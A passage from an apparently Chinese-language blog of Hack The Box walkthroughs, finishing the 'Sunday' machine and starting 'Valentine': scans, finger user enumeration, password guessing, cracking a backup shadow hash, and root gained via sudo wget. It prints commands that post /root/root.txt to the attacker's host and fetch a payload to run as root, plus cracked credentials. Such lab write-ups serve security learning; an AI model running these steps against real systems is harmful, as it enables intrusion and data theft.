fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/14%OT=79%CT=5%CU=31867%PV=Y%DS=2%DC=T%G=Y%TM=6257AA5\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=\nOS:7)OPS(O1=ST11M505NW2%O2=ST11M505NW2%O3=NNT11M505NW2%O4=ST11M505NW2%O5=ST\nOS:11M505NW2%O6=ST11M505)WIN(W1=FB1E%W2=FB1E%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF\nOS:7)ECN(R=Y%DF=Y%T=3C%W=FAFA%O=M505NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S\nOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M505NW\nOS:2%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T7(R=N)U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE\nOS:(R=Y%DFI=Y%T=FF%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   142.34 ms 10.10.14.1\n2   142.67 ms 10.10.10.76\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 498.43 seconds\n```\n79 ç«¯å£æœ‰ä¸€ä¸ª finger?ï¼Œæœ€åä¸€ä¸ªå­—æ¯æ˜¯å•¥å°±ä¸çŸ¥é“äº†å»æœæœçœ‹æœ‰æ²¡æœ‰æ¼æ´\n\n## Searchsploit\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# searchsploit finger\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nBSD 4.2 - 'fingerd' Remote Buffer Overflow                                                                                                                                        | bsd/remote/19039.txt\ncfingerd 1.4 - Format String (1)                                                                                                                                                  | linux/remote/20748.pl\ncfingerd 1.4 - Format String (2)                                                                                                                                                  | linux/remote/20749.c\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (1)                                                                                                                  | unix/local/20962.pl\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (2)                                                                                                                  | unix/local/20963.c\ncfingerd 1.4.1/1.4.2/1.4.3 Utilities - Local Buffer Overflow (3)                                                                                                                  | unix/local/20964.c\nDaniel Beckham The Finger Server 0.82 Beta - Pipe                                                                                                                                 | cgi/remote/19745.txt\nFingerTec Fingerprint Reader - Remote Access and Remote Enrolment                                                                                                                 | hardware/remote/39227.txt\nGNU Ffingerd 1.19 - 'Username' Validity Disclosure                                                                                                                                | unix/remote/20327.txt\nGranding MA300 - Traffic Sniffing Man In The Middle Fingerprint PIN Disclosure                                                                                                    | multiple/remote/39292.pl\nMartin Schulze Cfingerd 1.4.2 - GECOS Buffer Overflow                                                                                                                             | freebsd/local/19504.c\nMorris Worm - fingerd Stack Buffer Overflow (Metasploit)                                                                                                                          | bsd/remote/45791.rb\nOpenVms 8.3 Finger Service - Stack Buffer Overflow                                                                                                                                | multiple/dos/32193.txt\nSDFingerD 1.1 - Failure To Drop Privileges Privilege Escalation                                                                                                                   | linux/local/22806.sh\nWindows TCPIP Finger Command - C2 Channel and Bypassing Security Software                                                                                                         | windows/local/48815.txt\nzkfingerd 0.9.1 - 'say()' Format String                                                                                                                                           | linux/remote/22101.c\nzkfingerd SysLog 0.9.1 - Format String                                                                                                                                            | linux/remote/22091.c\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Paper Title                                                                                                                                                                      |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nAddress Relay Fingerprinting (How to Use Often Discarded Bugs)                                                                                                                    | english/13193-address-relay-fing\nAutomated Web Application Fingerprinting                                                                                                                                          | docs/english/17538-automated-web\nBitter Harvest: Systematically Fingerprinting Low- and Medium-interaction Honeypots at Internet Scale                                                                             | docs/english/45365-bitter-harves\n[Portuguese] Web Apps Fingerprinting                                                                                                                                              | portuguese/13683-[portuguese]-we\n[Spanish] El fingerprinting dentro de la seguridad web                                                                                                                            | docs/spanish/18421-[spanish]-el-\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n```\næœå‡ºæ¥çš„ç»“æœä¸å°‘ï¼Œé¦–å…ˆæ’é™¤æ‰ cfingerd ä»¥åŠå…¶ä»–çš„å¹²æ‰°ï¼Œå°±å‰©ä¸‹äº†ä¸€ä¸ª Morris Worm - fingerd Stack Buffer Overflow (Metasploit)\n\nå»å°è¯•ä¸€ä¸‹\n\n## Metasploit\n```bash\nmsf6 > search fingerd\n\nMatching Modules\n================\n\n   #  Name                                   Disclosure Date  Rank    Check  Description\n   -  ----                                   ---------------  ----    -----  -----------\n   0  exploit/bsd/finger/morris_fingerd_bof  1988-11-02       normal  Yes    Morris Worm fingerd Stack Buffer Overflow\n\nInteract with a module by name or index. For example info 0, use 0 or use exploit/bsd/finger/morris_fingerd_bof\n\nmsf6 > use 0\n[*] Using configured payload bsd/vax/shell_reverse_tcp\n```\nå»è®¾ç½®ä¸€ä¸‹é…ç½®\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > show options \n\nModule options (exploit/bsd/finger/morris_fingerd_bof):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS  10.10.10.76      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   79               yes       The target port (TCP)\n\nPayload options (bsd/vax/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.7       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   @(#)fingerd.c   5.1 (Berkeley) 6/6/85\n```\nç„¶åå»æ‰§è¡Œ\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > exploit \n\n[-] 10.10.10.76:79 - Exploit failed: bsd/vax/shell_reverse_tcp: All encoders failed to encode.\n[*] Exploit completed, but no session was created.\n```\nè¿™è¾¹æ˜¯å¤±è´¥äº†ï¼Œæˆ‘ä»¬å»çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è„šæœ¬\n\n```bash\nmsf6 exploit(bsd/finger/morris_fingerd_bof) > search finger\n\nMatching Modules\n================\n\n   #   Name                                            Disclosure Date  Rank    Check  Description\n   -   ----                                            ---------------  ----    -----  -----------\n   0   exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free\n   1   auxiliary/scanner/finger/finger_users                            normal  No     Finger Service User Enumerator\n   2   auxiliary/server/browser_autopwn                                 normal  No     HTTP Client Automatic Exploiter\n   3   exploit/bsd/finger/morris_fingerd_bof           1988-11-02       normal  Yes    Morris Worm fingerd Stack Buffer Overflow\n   4   auxiliary/gather/mybb_db_fingerprint            2014-02-13       normal  Yes    MyBB Database Fingerprint\n   5   exploit/windows/http/bea_weblogic_post_bof      2008-07-17       great   Yes    Oracle Weblogic Apache Connector POST Request Buffer Overflow\n   6   auxiliary/scanner/oracle/isqlplus_login                          normal  No     Oracle iSQL*Plus Login Utility\n   7   auxiliary/scanner/oracle/isqlplus_sidbrute                       normal  No     Oracle iSQLPlus SID Check\n   8   post/windows/gather/enum_putty_saved_sessions                    normal  No     PuTTY Saved Sessions Enumeration Module\n   9   auxiliary/scanner/smb/smb_version                                normal  No     SMB Version Detection\n   10  auxiliary/scanner/vmware/esx_fingerprint                         normal  No     VMWare ESX/ESXi Fingerprint Scanner\n\nInteract with a module by name or index. For example info 10, use 10 or use auxiliary/scanner/vmware/esx_fingerprint\n```\nè¿™é‡Œæœ‰ä¸€ä¸ªæ‰«æç”¨æˆ·åçš„ auxiliary/scanner/finger/finger\\_usersï¼Œå»å°è¯•ä¸€ä¸‹\n\n```bash\nmsf6 auxiliary(scanner/finger/finger_users) > show options \n\nModule options (auxiliary/scanner/finger/finger_users):\n\n   Name        Current Setting                                                Required  Description\n   ----        ---------------                                                --------  -----------\n   RHOSTS      10.10.10.76                                                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT       79                                                             yes       The target port (TCP)\n   THREADS     1                                                              yes       The number of concurrent threads (max one per host)\n   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of default UNIX accounts.\n```\n```bash\nmsf6 auxiliary(scanner/finger/finger_users) > exploit \n\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ikeuser\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netadm\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netcfg\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dhcpserv\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: daemon\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ftp\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sshd\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: aiuser\n[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: openldap\n[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, aiuser, bin, daemon, dhcpserv, dladm, ftp, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, openldap, root, sshd, sys\n[*] 10.10.10.76:79        - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n# æ¼æ´åˆ©ç”¨\nè¿™ä¸ªä¼¼ä¹ä¸å¥½ç”¨ï¼Œæˆ‘å»æ‰¾åˆ°äº†ä¸€ä¸ªè„šæœ¬\n\n> [https://github.com/pentestmonkey/finger-user-enum.git](https://github.com/pentestmonkey/finger-user-enum.git)\n\nç„¶åå†æ‰§è¡Œè¯•è¯•\n\n```bash\n./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76 | less -S\n\nStarting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )\n\n ----------------------------------------------------------\n|                   Scan Information                       |\n ----------------------------------------------------------\n\nWorker Processes ......... 5\nUsernames file ........... /usr/share/seclists/Usernames/Names/names.txt\nTarget count ............. 1\nUsername count ........... 10177\nTarget TCP port .......... 79\nQuery timeout ............ 5 secs\nRelay Server ............. Not used\n\n######## Scan started at Thu Apr 14 01:51:49 2022 #########\naccess@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..\nadmin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm>\nbin@10.10.10.76: bin             ???                         < .  .  .  . >..\ndee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..\nike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..\njo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..\nla verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..\nline@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..\nmessage@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..\nmiof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..\nroot@10.10.10.76: root     Super-User            console      <Dec 19 10:30>..\nsammy@10.10.10.76: sammy           ???            console      <Dec 19 08:35>..\nsunny@10.10.10.76: sunny           ???            console      <Dec 19 09:56>..\nsys@10.10.10.76: sys             ???                         < .  .  .  . >..\nzsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..\n######## Scan completed at Thu Apr 14 02:29:46 2022 #########\n15 results.\n\n10177 queries in 2277 seconds (4.5 queries / sec)\n```\nè¿™é‡Œæœ‰ä¸‰ä¸ªç”¨æˆ·ä¸ä¸€æ ·ï¼Œéƒ½æœ‰ç™»å½•ä¿¡æ¯ã€‚åˆ†åˆ«æ˜¯ rootã€sammyã€sunny\n\næ ¹æ®é¶æœºå›¾åƒå’Œåå­—åˆ¤æ–­ï¼Œè´¦æˆ·åº”è¯¥æ˜¯ sunnyï¼Œå¯†ç å¯èƒ½æ˜¯ sunday\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel/Desktop]\nâ””â”€# ssh -p 22022 sunny@10.10.10.76\nThe authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.\nED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '[10.10.10.76]:22022' (ED25519) to the list of known hosts.\nPassword:\nWarning: 4 failed authentication attempts since last successful authentication.  The latest at Thu Apr 14 06:59 2022.\nLast login: Sun Dec 19 09:56:51 2021 on console\nOracle Corporation      SunOS 5.11      11.4    Aug 2018\nsunny@sunday:~$ whoami&&id\nsunny\nuid=101(sunny) gid=10(staff)\n```\næˆåŠŸè¿›å…¥ user æƒé™\n\n```bash\nsunny@sunday:/home/sammy$ cat user.txt\na3d9498027ca5187ba1793943ee8a598\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nsunny@sunday:/home/sammy$ sudo -l\nç”¨æˆ· sunny å¯ä»¥åœ¨ sunday ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n    (root) NOPASSWD: /root/troll\n```\nä½¿ç”¨ sudo -l æŸ¥çœ‹äº†ä¸€ä¸‹æƒé™ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ root æƒé™è¿è¡Œ /root/troll\n\nè¿è¡Œä¸€ä¸‹çœ‹çœ‹\n\n```bash\nsunny@sunday:/home/sammy$ sudo /root/troll\nsudo: /root/trollï¼šæ‰¾ä¸åˆ°å‘½ä»¤\n```\næç¤ºæ‰¾ä¸åˆ°ï¼Ÿé‚£æ‰¾æ‰¾å…¶ä»–è·¯å­\n\n```bash\nsunny@sunday:/backup$ ls\nagent22.backup  shadow.backup\nsunny@sunday:/backup$ cat shadow.backup\nmysql:NP:::::::\nopenldap:*LK*:::::::\nwebservd:*LK*:::::::\npostgres:NP:::::::\nsvctag:*LK*:6445::::::\nnobody:*LK*:6445::::::\nnoaccess:*LK*:6445::::::\nnobody4:*LK*:6445::::::\nsammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::\nsunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::\n```\nåœ¨ç›®å½• /backup ä¸­æ‰¾åˆ°äº†ä¸€ä¸ª shadow.backup çš„æ–‡ä»¶ï¼Œæ‹¿åˆ°äº†ä¸€ä¸²hashï¼Œå»å°è¯•çˆ†ç ´ä¸€ä¸‹\n\n```bash\necho $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB > hash\n```\nç„¶åå¼€å§‹çˆ†ç ´\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# hashcat -m 7400 hash /usr/share/wordlists/rockyou.txt \nhashcat (v6.1.1) starting...\n\nOpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n=============================================================================================================================\n* Device #1: pthread-Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, 2878/2942 MB (1024 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n\nATTENTION! Pure (unoptimized) backend kernels selected.\nUsing pure kernels enables cracking longer passwords but for the price of drastically reduced performance.\nIf you want to switch to optimized backend kernels, append -O to your commandline.\nSee the above message to find out about the exact limits.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\nHost memory required for this attack: 65 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\n$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: sha256crypt $5$, SHA256 (Unix)\nHash.Target......: $5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB\nTime.Started.....: Thu Apr 14 21:29:17 2022 (2 mins, 59 secs)\nTime.Estimated...: Thu Apr 14 21:32:16 2022 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:     1145 H/s (13.57ms) @ Accel:128 Loops:128 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 203776/14344385 (1.42%)\nRejected.........: 0/203776 (0.00%)\nRestore.Point....: 203264/14344385 (1.42%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000\nCandidates.#1....: dadof3 -> chs2009\n\nStarted: Thu Apr 14 21:28:48 2022\nStopped: Thu Apr 14 21:32:17 2022\n```\nå¾—åˆ°äº†å¯†ç \n\n```bash\nusername = sammy\npassword = cooldude!\n```\nå»ç™»å½•ä¸€ä¸‹\n\n```bash\nsunny@sunday:~$ su sammy\nPassword:\nsammy@sunday:~$ whoami&&id\nsammy\nuid=100(sammy) gid=10(staff)\n```\n```bash\nsammy@sunday:~$ sudo -l\nç”¨æˆ· sammy å¯ä»¥åœ¨ sunday ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n    (ALL) ALL\n    (root) NOPASSWD: /usr/bin/wget\n```\nä½¿ç”¨ sudo -l æŸ¥çœ‹ä¸€ä¸‹æƒé™ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ root æƒé™è¿è¡Œ wgetï¼Œé‚£å°±å¥½åŠäº† æœ‰æ–¹æ¡ˆäº†\n\nç„¶åä½¿ç”¨ wget çš„ --post-file æ‹¿æˆ‘ä»¬è¦çš„æ–‡ä»¶\n\n```bash\nsudo wget --post-file=/root/root.txt 10.10.14.2\n```\n```bash\nsudo wget http://10.10.14.7/payload.sh -o /root/troll\n```\nç„¶åå›åˆ° sunny ç”¨æˆ·ï¼Œä½¿ç”¨ sudo /root/troll æ‰§è¡Œ\n\n```bash\nsudo /root/troll\n```\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£åï¼Œå†æ‰§è¡Œè¿™æ¡å‘½ä»¤\n\n```bash\nnc -nvlp 80\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.76] 59151\nPOST / HTTP/1.1\nUser-Agent: Wget/1.19.5 (solaris2.11)\nAccept: */*\nAccept-Encoding: identity\nHost: 10.10.14.2\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nfb40fab61d99d37536daeec0d97af9b8\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Valentine - Hackthebox","url":"/2022/04/12/Hackthebox/Easy/Hackthebox-Valentine/","content":"\n# Hackthebox - Valentine\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Valentine/05a3804f-8e5b-4deb-9d41-f8a8347b588e.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Valentine/c3466ca0-b507-40ca-a056-5705ce54b48d.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.79\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 14:15 CST\nNmap scan report for 10.10.10.79\nHost is up (0.14s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)\n|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)\n|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)\n80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))\n|_http-server-header: Apache/2.2.22 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))\n|_http-server-header: Apache/2.2.22 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US\n| Not valid before: 2018-02-06T00:45:25\n|_Not valid after:  2019-02-06T00:45:25\n|_ssl-date: 2022-04-12T06:19:55+00:00; +3m16s from scanner time.\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/12%OT=22%CT=1%CU=37713%PV=Y%DS=2%DC=T%G=Y%TM=6255194\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OPS\nOS:(O1=M505ST11NW4%O2=M505ST11NW4%O3=M505NNT11NW4%O4=M505ST11NW4%O5=M505ST1\nOS:1NW4%O6=M505ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN\nOS:(R=Y%DF=Y%T=40%W=3908%O=M505NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M505ST11NW4%RD=\nOS:0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=\nOS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R\nOS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 3m15s\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   140.62 ms 10.10.14.1\n2   140.81 ms 10.10.10.79\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 47.93 seconds\n```\n## Http\n![](Hackthebox-Valentine/9fb744bf-5412-42e0-9c4b-20a003bc68c4.png)\n\næ²¡çœ‹åˆ°æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œå»åšä¸ª fuzz\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel]\nâ””â”€# gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.79/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/12 14:23:09 Starting gobuster in directory enumeration mode\n===============================================================\n/index                (Status: 200) [Size: 38]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]\n/encode               (Status: 200) [Size: 554]\n/decode               (Status: 200) [Size: 552]\n/omg                  (Status: 200) [Size: 153356]\n/server-status        (Status: 403) [Size: 292]\n\n===============================================================\n2022/04/12 14:26:56 Finished\n===============================================================\n```\nè¿™é‡Œæœ‰ä¸€ä¸ª /dev ç›®å½•ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Valentine/b621df23-2c29-4590-9899-4f019ce1880c.png)\n\n/dev ä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶ hype\\_key å’Œ notes.txt\n\nå»åˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nnotes.txt\n\nTo do:\n\n1) Coffee.\n2) Research.\n3) Fix decoder/encoder before going live.\n4) Make sure encoding/decoding is only done client-side.\n5) Don't use the decoder/encoder until any of this is done.\n6) Find a better way to take notes.\n```\n```bash\nhype_key\n\n2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 